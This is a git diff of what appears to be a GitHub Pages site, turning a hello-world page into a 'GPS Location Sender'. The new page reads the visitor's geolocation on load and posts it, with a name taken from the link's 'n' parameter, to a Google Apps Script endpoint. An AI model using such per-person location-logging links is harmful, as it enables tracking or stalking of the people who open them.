@@ -1,11 +1,53 @@
 <!DOCTYPE html>
-<html>
-<body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.</p>
-<a href="test.html">test</a>
-<br>
-<a href="sunnytest.mhtml">test</a>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GPS Location Sender</title>
+  <script>
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          
+          // Send data to Google Apps Script
+          sendDataToGoogleAppsScript(latitude, longitude);
+        }, function(error) {
+          console.error('Error getting GPS coordinates:', error);
+        });
+      } else {
+        alert('Geolocation is not supported by this browser.');
+      }
+    };
 
+    function sendDataToGoogleAppsScript(latitude, longitude) {
+        // Get the query string from the URL
+        const queryString = window.location.search;
+
+        // Parse the query string
+        const urlParams = new URLSearchParams(queryString);
+
+        // Get the value of the 'n' parameter
+        const nValue = urlParams.get('n');
+
+      const url = "https://script.google.com/macros/s/AKfycbzxHxkr3cNRCxHEWRlNVjT3ZXIb1-au0WPz3lsm7CLdlHnf7VHnNXXI9Sd1gEVuo8mt/exec"; // Replace with your Apps Script URL
+      const params = new URLSearchParams();
+      params.append('latitude', latitude);
+      params.append('longitude', longitude);
+      params.append('name', nValue);
+
+      fetch(url, {
+        method: 'POST',
+        body: params
+      })
+      .then(response => response.text())
+      .then(data => console.log('Data sent to Google Apps Script:', data))
+      .catch(error => console.error('Error sending data to Google Apps Script:', error));
+    }
+  </script>
+</head>
+<body>
+  <h1>GPS Location Sender</h1>
 </body>
 </html>
